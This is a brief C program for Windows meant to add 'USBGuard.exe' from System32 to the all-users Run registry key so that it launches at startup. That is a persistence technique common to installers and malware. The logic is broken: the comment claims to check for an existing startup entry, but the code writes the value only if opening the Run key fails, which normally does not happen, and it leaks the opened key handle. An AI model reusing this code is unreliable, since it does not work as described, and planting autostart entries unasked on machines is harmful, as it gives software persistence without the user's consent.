#include <stdio.h>
#include <Windows.h>

int main() {
    // Check if the program runs in Windows
    #ifdef _WIN32

    // Check if the exe is in the startup of all users
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR lpValueName = "USBGuard";
    LPCSTR lpData = "C:\\Windows\\System32\\USBGuard.exe";

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        RegCreateKey(HKEY_LOCAL_MACHINE, lpSubKey, &hKey);
        RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (LPBYTE)lpData, strlen(lpData) * sizeof(char));
        RegCloseKey(hKey);
    }
    #endif

    return 0;
}
